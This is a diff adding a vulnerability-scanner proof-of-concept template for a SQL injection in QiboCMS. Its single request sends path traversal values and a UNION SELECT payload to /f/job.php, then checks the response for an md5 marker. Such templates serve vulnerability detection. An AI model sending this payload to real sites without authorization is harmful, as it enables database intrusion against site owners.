@@ -1,0 +1,12 @@
+name: poc-yaml-qibocms-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /f/job.php?job=getzone&typeid=zone&fup=..\..\do\js&id=514125&webdb[web_open]=1&webdb[cache_time_js]=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,md5({{rand}}),9,10,11,12,13,14,15,16,17,18,19%23
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: Rexus
+  links:
+    - https://www.ld-fcw.com/
